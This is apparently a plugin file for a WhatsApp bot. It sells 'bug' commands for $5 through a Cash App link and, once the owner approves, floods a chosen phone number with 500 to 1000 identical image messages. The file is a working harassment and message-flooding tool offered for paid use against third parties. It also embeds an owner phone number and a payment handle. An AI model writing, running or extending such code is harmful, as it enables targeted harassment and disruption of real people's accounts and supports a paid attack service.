const { cmd } = require('../command');
const store = {};
const premium = {};
const OWNER_NUMBER = '50942241547@s.whatsapp.net';

function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}

function addBugCommand(name, desc, count) {
  cmd({
    pattern: name,
    desc: desc,
    category: 'bug',
    filename: __filename,
  }, async (conn, m, { args, reply }) => {
    const sender = m.sender;

    if (sender !== OWNER_NUMBER && !premium[sender]) {
      return reply(`💵 Send $5 to use this command:\nhttps://cash.app/$berryxoe\n\nOnce paid, wait for confirmation.`);
    }

    const number = args[0];
    if (!number) return reply(`❌ Example: .${name} 13057487562`);
    const target = number + '@s.whatsapp.net';
    
    store[m.key.id] = { target, count, sender };

    await conn.sendMessage(OWNER_NUMBER, {
      text: `⚠️ @${sender.split('@')[0]} requested *${name.toUpperCase()} bug*\nTarget: ${number}\n\n🆔 ID: ${m.key.id}\nReply:\n✅ yes ${m.key.id}\n❌ no ${m.key.id}`,
      mentions: [sender]
    }, { quoted: m });
  });
}

addBugCommand('zarya', 'Send ZARYA bug (500)', 500);
addBugCommand('dawens', 'Send DAWENS bug (800)', 800);
addBugCommand('xios', 'Send XIOS bug (1000)', 1000);

cmd({
  pattern: 'accept',
  desc: 'Confirm payment',
  category: 'owner',
  filename: __filename,
}, async (conn, m, { args, reply }) => {
  const number = args[0];
  if (!number) return reply('Example: .accept 50942240000');

  const jid = number + '@s.whatsapp.net';
  premium[jid] = true;
  await reply(`✅ ${number} is now premium.`);
  await conn.sendMessage(jid, { text: `🎉 You are now premium. You can use all commands.` });
});

cmd({
  pattern: 'remove',
  desc: 'Remove premium',
  category: 'owner',
  filename: __filename,
}, async (conn, m, { args, reply }) => {
  const number = args[0];
  if (!number) return reply('Example: .remove 50942240000');

  const jid = number + '@s.whatsapp.net';
  delete premium[jid];
  await reply(`❌ ${number} removed from premium.`);
  await conn.sendMessage(jid, { text: `Your premium access has been removed.` });
});

conn.ev.on('messages.upsert', async ({ messages }) => {
  const m = messages[0];
  if (!m.message?.conversation) return;

  const from = m.key.remoteJid;
  if (from !== OWNER_NUMBER) return;

  const text = m.message.conversation.toLowerCase().trim();
  const [status, id] = text.split(' ');

  if (status !== 'yes' && status !== 'no') return;

  const data = store[id];
  if (!data) return await conn.sendMessage(from, { text: 'No pending request for this ID.' });

  if (status === 'yes') {
    await conn.sendMessage(from, { text: `Sending ${data.count} bugs to ${data.target}...` });

    for (let i = 0; i < data.count; i++) {
      await conn.sendMessage(data.target, {
        image: { url: 'https://files.catbox.moe/pbamxw.jpeg' },
        caption: 'ZARYA BUG 🐛',
      });
    }

    await conn.sendMessage(from, { text: 'Done.' });
  } else {
    await conn.sendMessage(from, { text: 'Request denied.' });
  }

  delete store[id];
});
